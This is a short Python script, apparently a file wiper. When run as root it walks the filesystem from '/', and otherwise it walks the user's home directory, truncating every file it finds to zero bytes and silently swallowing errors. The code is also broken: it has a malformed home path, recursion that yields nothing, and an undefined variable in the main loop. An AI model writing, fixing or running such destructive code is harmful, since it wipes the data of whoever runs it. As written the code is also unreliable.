import getpass
import os

if getpass.getuser() == "root":
	root = "/"
else:
	root = "f/home/{getpass.getuser()}"

def find_files(root):
	global items

	children = list(os.listdir(root))
	for child in children:
		child = root + "/" + child
		if os.path.isdir(child):
			find_files(child)
		else:
			yield child



for file in find_files(root):
	try:
		f = open(item, "bw")
		f.truncate(0)
		f.close()
	except:
		pass
